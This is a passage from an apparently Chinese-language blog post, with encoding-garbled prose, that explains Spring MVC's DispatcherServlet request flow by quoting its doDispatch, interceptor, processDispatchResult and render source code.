<span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">			String resumed = WebAsyncUtils.getAsyncManager(request).hasConcurrentResult() ? <span class="string">" resumed"</span> : <span class="string">""</span>;</span><br><span class="line">			logger.debug(<span class="string">"DispatcherServlet with name '"</span> + getServletName() + <span class="string">"'"</span> + resumed +</span><br><span class="line">					<span class="string">" processing "</span> + request.getMethod() + <span class="string">" request for ["</span> + getRequestUri(request) + <span class="string">"]"</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Keep a snapshot of the request attributes in case of an include,</span></span><br><span class="line">		<span class="comment">// to be able to restore the original attributes after the include.</span></span><br><span class="line">		Map&lt;String, Object&gt; attributesSnapshot = <span class="keyword">null</span>;</span><br><span class="line">		<span class="keyword">if</span> (WebUtils.isIncludeRequest(request)) &#123;</span><br><span class="line">			attributesSnapshot = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">			Enumeration&lt;?&gt; attrNames = request.getAttributeNames();</span><br><span class="line">			<span class="keyword">while</span> (attrNames.hasMoreElements()) &#123;</span><br><span class="line">				String attrName = (String) attrNames.nextElement();</span><br><span class="line">				<span class="keyword">if</span> (<span class="keyword">this</span>.cleanupAfterInclude || attrName.startsWith(<span class="string">"org.springframework.web.servlet"</span>)) &#123;</span><br><span class="line">					attributesSnapshot.put(attrName, request.getAttribute(attrName));</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Make framework objects available to handlers and view objects.</span></span><br><span class="line">		request.setAttribute(WEB_APPLICATION_CONTEXT_ATTRIBUTE, getWebApplicationContext());</span><br><span class="line">		request.setAttribute(LOCALE_RESOLVER_ATTRIBUTE, <span class="keyword">this</span>.localeResolver);</span><br><span class="line">		request.setAttribute(THEME_RESOLVER_ATTRIBUTE, <span class="keyword">this</span>.themeResolver);</span><br><span class="line">		request.setAttribute(THEME_SOURCE_ATTRIBUTE, getThemeSource());</span><br><span class="line"></span><br><span class="line">		FlashMap inputFlashMap = <span class="keyword">this</span>.flashMapManager.retrieveAndUpdate(request, response);</span><br><span class="line">		<span class="keyword">if</span> (inputFlashMap != <span class="keyword">null</span>) &#123;</span><br><span class="line">			request.setAttribute(INPUT_FLASH_MAP_ATTRIBUTE, Collections.unmodifiableMap(inputFlashMap));</span><br><span class="line">		&#125;</span><br><span class="line">		request.setAttribute(OUTPUT_FLASH_MAP_ATTRIBUTE, <span class="keyword">new</span> FlashMap());</span><br><span class="line">		request.setAttribute(FLASH_MAP_MANAGER_ATTRIBUTE, <span class="keyword">this</span>.flashMapManager);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			doDispatch(request, response);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">finally</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (!WebAsyncUtils.getAsyncManager(request).isConcurrentHandlingStarted()) &#123;</span><br><span class="line">				<span class="comment">// Restore the original attribute snapshot, in case of an include.</span></span><br><span class="line">				<span class="keyword">if</span> (attributesSnapshot != <span class="keyword">null</span>) &#123;</span><br><span class="line">					restoreAttributesAfterInclude(request, attributesSnapshot);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>æ¯æ¬¡è¯·æ±‚è¿‡æ¥éƒ½ä¼šå°†ç³»ç»Ÿçš„ä¸€äº›å±æ€§å¡åˆ°requestçš„attributeä¸­ï¼Œä»¥ä¾¿åé¢çš„handlerså’Œviewèƒ½å¤Ÿè®¿é—®åˆ°ã€‚</p>
<p>å…¶ä¸­æ¯”è¾ƒé‡è¦çš„æ˜¯ <code>doDispatch(request, response)</code>ï¼Œæ­£æ˜¯è¿™ä¸ªæ–¹æ³•ä½¿å¾—è¯·æ±‚è¢«çœŸæ­£çš„è½¬å‘ã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Process the actual dispatching to the handler.</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;The handler will be obtained by applying the servlet's HandlerMappings in order.</span></span><br><span class="line"><span class="comment">	 * The HandlerAdapter will be obtained by querying the servlet's installed HandlerAdapters</span></span><br><span class="line"><span class="comment">	 * to find the first that supports the handler class.</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;All HTTP methods are handled by this method. It's up to HandlerAdapters or handlers</span></span><br><span class="line"><span class="comment">	 * themselves to decide which methods are acceptable.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> request current HTTP request</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> response current HTTP response</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@throws</span> Exception in case of any kind of processing failure</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doDispatch</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		HttpServletRequest processedRequest = request;</span><br><span class="line">		HandlerExecutionChain mappedHandler = <span class="keyword">null</span>;</span><br><span class="line">		<span class="keyword">boolean</span> multipartRequestParsed = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">		WebAsyncManager asyncManager = WebAsyncUtils.getAsyncManager(request);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			ModelAndView mv = <span class="keyword">null</span>;</span><br><span class="line">			Exception dispatchException = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				processedRequest = checkMultipart(request);</span><br><span class="line">				multipartRequestParsed = (processedRequest != request);</span><br><span class="line"></span><br><span class="line">				<span class="comment">// Determine handler for the current request.</span></span><br><span class="line">				mappedHandler = getHandler(processedRequest);</span><br><span class="line">				<span class="keyword">if</span> (mappedHandler == <span class="keyword">null</span> || mappedHandler.getHandler() == <span class="keyword">null</span>) &#123;</span><br><span class="line">					noHandlerFound(processedRequest, response);</span><br><span class="line">					<span class="keyword">return</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="comment">// Determine handler adapter for the current request.</span></span><br><span class="line">				HandlerAdapter ha = getHandlerAdapter(mappedHandler.getHandler());</span><br><span class="line"></span><br><span class="line">				<span class="comment">// Process last-modified header, if supported by the handler.</span></span><br><span class="line">				String method = request.getMethod();</span><br><span class="line">				<span class="keyword">boolean</span> isGet = <span class="string">"GET"</span>.equals(method);</span><br><span class="line">				<span class="keyword">if</span> (isGet || <span class="string">"HEAD"</span>.equals(method)) &#123;</span><br><span class="line">					<span class="keyword">long</span> lastModified = ha.getLastModified(request, mappedHandler.getHandler());</span><br><span class="line">					<span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">						logger.debug(<span class="string">"Last-Modified value for ["</span> + getRequestUri(request) + <span class="string">"] is: "</span> + lastModified);</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">if</span> (<span class="keyword">new</span> ServletWebRequest(request, response).checkNotModified(lastModified) &amp;&amp; isGet) &#123;</span><br><span class="line">						<span class="keyword">return</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!mappedHandler.applyPreHandle(processedRequest, response)) &#123;</span><br><span class="line">					<span class="keyword">return</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="comment">// Actually invoke the handler.</span></span><br><span class="line">				mv = ha.handle(processedRequest, response, mappedHandler.getHandler());</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;</span><br><span class="line">					<span class="keyword">return</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				applyDefaultViewName(processedRequest, mv);</span><br><span class="line">				mappedHandler.applyPostHandle(processedRequest, response, mv);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">				dispatchException = ex;</span><br><span class="line">			&#125;</span><br><span class="line">			processDispatchResult(processedRequest, response, mappedHandler, mv, dispatchException);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">			triggerAfterCompletion(processedRequest, response, mappedHandler, ex);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span> (Error err) &#123;</span><br><span class="line">			triggerAfterCompletionWithError(processedRequest, response, mappedHandler, err);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">finally</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;</span><br><span class="line">				<span class="comment">// Instead of postHandle and afterCompletion</span></span><br><span class="line">				<span class="keyword">if</span> (mappedHandler != <span class="keyword">null</span>) &#123;</span><br><span class="line">					mappedHandler.applyAfterConcurrentHandlingStarted(processedRequest, response);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="comment">// Clean up any resources used by a multipart request.</span></span><br><span class="line">				<span class="keyword">if</span> (multipartRequestParsed) &#123;</span><br><span class="line">					cleanupMultipart(processedRequest);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>handler è·å–çš„é¡ºåºæ˜¯ä»DispatcherServletçš„HandlerMappingä¸­æŒ‰é¡ºåºå–å‡ºçš„</p>
<p>Handlerå¯¹åº”çš„HandlerAdapterä¼šä»å®‰è£…çš„HandlerAdapteræ‰¾ï¼Œå°†è¿”å›ç¬¬ä¸€ä¸ªåˆé€‚çš„Adapter</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">HandlerExecutionChain mappedHandler = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Determine handler for the current request.</span></span><br><span class="line">mappedHandler = getHandler(processedRequest);</span><br><span class="line">            ...</span><br><span class="line"><span class="comment">// Determine handler adapter for the current request.</span></span><br><span class="line">HandlerAdapter ha = getHandlerAdapter(mappedHandler.getHandler());</span><br><span class="line">            ...</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!mappedHandler.applyPreHandle(processedRequest, response)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Actually invoke the handler.</span></span><br><span class="line">mv = ha.handle(processedRequest, response, mappedHandler.getHandler());</span><br><span class="line"></span><br><span class="line">mappedHandler.applyPostHandle(processedRequest, response, mv);</span><br><span class="line"></span><br><span class="line">processDispatchResult(processedRequest, response, mappedHandler, mv, dispatchException);</span><br></pre></td></tr></table></figure>
<p>åœ¨applyPreHandleä¸­ä¹Ÿæ˜¯æ£€æŸ¥æ‹¦æˆªå™¨çš„æ“ä½œï¼Œå¹¶æ ¹æ®æ‹¦æˆªå™¨è¿”å›çš„å¸ƒå°”ç±»å‹ï¼Œåˆ¤æ–­æ˜¯å¦è¿›ä¸€æ­¥å¤„ç†</p>
<p>å…¶ä¸­åœ¨applyPostHandleä¸­åˆæ£€æŸ¥æ˜¯å¦æœ‰å„ç§æ‹¦æˆªå™¨,è°ƒç”¨æ‹¦æˆªå™¨çš„postHandleæ–¹æ³•</p>
<p>å¤„ç†å®Œæ¯•åï¼Œè°ƒç”¨processDispatchResultæ–¹æ³•å°†å¤„ç†åçš„è¯·æ±‚å’Œmvè¿›è¡Œåˆ†å‘</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//HandlerExecutionChain.java</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Apply preHandle methods of registered interceptors.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> &#123;<span class="doctag">@code</span> true&#125; if the execution chain should proceed with the</span></span><br><span class="line"><span class="comment">	 * next interceptor or the handler itself. Else, DispatcherServlet assumes</span></span><br><span class="line"><span class="comment">	 * that this interceptor has already dealt with the response itself.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">boolean</span> <span class="title">applyPreHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		HandlerInterceptor[] interceptors = getInterceptors();</span><br><span class="line">		<span class="keyword">if</span> (!ObjectUtils.isEmpty(interceptors)) &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; interceptors.length; i++) &#123;</span><br><span class="line">				HandlerInterceptor interceptor = interceptors[i];</span><br><span class="line">				<span class="keyword">if</span> (!interceptor.preHandle(request, response, <span class="keyword">this</span>.handler)) &#123;</span><br><span class="line">					triggerAfterCompletion(request, response, <span class="keyword">null</span>);</span><br><span class="line">					<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">this</span>.interceptorIndex = i;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	* Apply postHandle methods of registered interceptors.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">applyPostHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, ModelAndView mv)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">	HandlerInterceptor[] interceptors = getInterceptors();</span><br><span class="line">	<span class="keyword">if</span> (!ObjectUtils.isEmpty(interceptors)) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = interceptors.length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">			HandlerInterceptor interceptor = interceptors[i];</span><br><span class="line">			interceptor.postHandle(request, response, <span class="keyword">this</span>.handler, mv);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>handlerå¤„ç†åçš„ç»“æœæ˜¯é€šè¿‡processDispatchResultä¼ å‡ºå»çš„</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//DispatcherServlet.java</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Handle the result of handler selection and handler invocation, which is</span></span><br><span class="line"><span class="comment">	 * either a ModelAndView or an Exception to be resolved to a ModelAndView.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">processDispatchResult</span><span class="params">(HttpServletRequest request, HttpServletResponse response,</span></span></span><br><span class="line"><span class="function"><span class="params">			HandlerExecutionChain mappedHandler, ModelAndView mv, Exception exception)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">boolean</span> errorView = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (exception != <span class="keyword">null</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (exception <span class="keyword">instanceof</span> ModelAndViewDefiningException) &#123;</span><br><span class="line">				logger.debug(<span class="string">"ModelAndViewDefiningException encountered"</span>, exception);</span><br><span class="line">				mv = ((ModelAndViewDefiningException) exception).getModelAndView();</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				Object handler = (mappedHandler != <span class="keyword">null</span> ? mappedHandler.getHandler() : <span class="keyword">null</span>);</span><br><span class="line">				mv = processHandlerException(request, response, handler, exception);</span><br><span class="line">				errorView = (mv != <span class="keyword">null</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Did the handler return a view to render?</span></span><br><span class="line">		<span class="keyword">if</span> (mv != <span class="keyword">null</span> &amp;&amp; !mv.wasCleared()) &#123;</span><br><span class="line">			render(mv, request, response);</span><br><span class="line">			<span class="keyword">if</span> (errorView) &#123;</span><br><span class="line">				WebUtils.clearErrorRequestAttributes(request);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">				logger.debug(<span class="string">"Null ModelAndView returned to DispatcherServlet with name '"</span> + getServletName() +</span><br><span class="line">						<span class="string">"': assuming HandlerAdapter completed request handling"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (WebAsyncUtils.getAsyncManager(request).isConcurrentHandlingStarted()) &#123;</span><br><span class="line">			<span class="comment">// Concurrent handling started during a forward</span></span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (mappedHandler != <span class="keyword">null</span>) &#123;</span><br><span class="line">			mappedHandler.triggerAfterCompletion(request, response, <span class="keyword">null</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>å»å„ç§åˆ¤æ–­ï¼Œæ ¸å¿ƒçš„æ–¹æ³•å°±åœ¨<code>render(mv, request, response)</code>;</p>
<p>å®ƒè´Ÿè´£æ¸²æŸ“è¿”å›çš„<code>ModelAndView</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//DispatcherServlet.java</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	* Render the given ModelAndView.</span></span><br><span class="line"><span class="comment">	* &lt;p&gt;This is the last stage in handling a request. It may involve resolving the view by name.</span></span><br><span class="line"><span class="comment">	* <span class="doctag">@param</span> mv the ModelAndView to render</span></span><br><span class="line"><span class="comment">	* <span class="doctag">@param</span> request current HTTP servlet request</span></span><br><span class="line"><span class="comment">	* <span class="doctag">@param</span> response current HTTP servlet response</span></span><br><span class="line"><span class="comment">	* <span class="doctag">@throws</span> ServletException if view is missing or cannot be resolved</span></span><br><span class="line"><span class="comment">	* <span class="doctag">@throws</span> Exception if there's a problem rendering the view</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">render</span><span class="params">(ModelAndView mv, HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		<span class="comment">// Determine locale for request and apply it to the response.</span></span><br><span class="line">		Locale locale = <span class="keyword">this</span>.localeResolver.resolveLocale(request);</span><br><span class="line">		response.setLocale(locale);</span><br><span class="line"></span><br><span class="line">		View view;</span><br><span class="line">		<span class="keyword">if</span> (mv.isReference()) &#123;</span><br><span class="line">			<span class="comment">// We need to resolve the view name.</span></span><br><span class="line">			view = resolveViewName(mv.getViewName(), mv.getModelInternal(), locale, request);</span><br><span class="line">			<span class="keyword">if</span> (view == <span class="keyword">null</span>) &#123;</span><br><span class="line">				<span class="keyword">throw</span> <span class="keyword">new</span> ServletException(<span class="string">"Could not resolve view with name '"</span> + mv.getViewName() +</span><br><span class="line">						<span class="string">"' in servlet with name '"</span> + getServletName() + <span class="string">"'"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">// No need to lookup: the ModelAndView object contains the actual View object.</span></span><br><span class="line">			view = mv.getView();</span><br><span class="line">			<span class="keyword">if</span> (view == <span class="keyword">null</span>) &#123;</span><br><span class="line">				<span class="keyword">throw</span> <span class="keyword">new</span> ServletException(<span class="string">"ModelAndView ["</span> + mv + <span class="string">"] neither contains a view name nor a "</span> +</span><br><span class="line">						<span class="string">"View object in servlet with name '"</span> + getServletName() + <span class="string">"'"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Delegate to the View object for rendering.</span></span><br><span class="line">		<span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">			logger.debug(<span class="string">"Rendering view ["</span> + view + <span class="string">"] in DispatcherServlet with name '"</span> + getServletName() + <span class="string">"'"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			view.render(mv.getModelInternal(), request, response);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">			<span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">				logger.debug(<span class="string">"Error rendering view ["</span> + view + <span class="string">"] in DispatcherServlet with name '"</span> +</span><br><span class="line">						getServletName() + <span class="string">"'"</span>, ex);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">throw</span> ex;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªå‡½æ•°è§£æmvå¯¹è±¡ï¼Œå¦‚æœæ˜¯ä¸€ä¸ªå¼•ç”¨åå°±æŸ¥æ‰¾å¯¹åº”çš„viewï¼Œæœ€ç»ˆè¿”å›ä¸€ä¸ªViewå¯¹è±¡ï¼Œ</p>
<p>ç„¶åå°†æ¸²æŸ“çš„å·¥ä½œå§”æ‰˜ç»™è¿™ä¸ªviewå¯¹è±¡ï¼Œ<code>view.render(mv.getModelInternal(), request, response);</code></p>
<p>å…¶ä¸­<code>resolveViewName</code>æ–¹æ³•éå† <code>DispatcherServlet</code>ä¸­æ³¨å†Œçš„<code>viewResolver</code>ï¼Œè¿”å›ç¬¬ä¸€ä¸ªéç©ºçš„ç»“æœ</p>
<p>æŸ¥æ‰¾è§†å›¾åç§°çš„æ–¹æ³•å¦‚ä¸‹:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/** List of ViewResolvers used by this servlet */</span></span><br><span class="line"><span class="keyword">private</span> List&lt;ViewResolver&gt; viewResolvers;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	* Resolve the given view name into a View object (to be rendered).</span></span><br><span class="line"><span class="comment">	* &lt;p&gt;The default implementations asks all ViewResolvers of this dispatcher.</span></span><br><span class="line"><span class="comment">	* Can be overridden for custom resolution strategies, potentially based on</span></span><br><span class="line"><span class="comment">	* specific model attributes or request parameters.</span></span><br><span class="line"><span class="comment">	* <span class="doctag">@param</span> viewName the name of the view to resolve</span></span><br><span class="line"><span class="comment">	* <span class="doctag">@param</span> model the model to be passed to the view</span></span><br><span class="line"><span class="comment">	* <span class="doctag">@param</span> locale the current locale</span></span><br><span class="line"><span class="comment">	* <span class="doctag">@param</span> request current HTTP servlet request</span></span><br><span class="line"><span class="comment">	* <span class="doctag">@return</span> the View object, or &#123;<span class="doctag">@code</span> null&#125; if none found</span></span><br><span class="line"><span class="comment">	* <span class="doctag">@throws</span> Exception if the view cannot be resolved</span></span><br><span class="line"><span class="comment">	* (typically in case of problems creating an actual View object)</span></span><br><span class="line"><span class="comment">	* <span class="doctag">@see</span> ViewResolver#resolveViewName</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> View <span 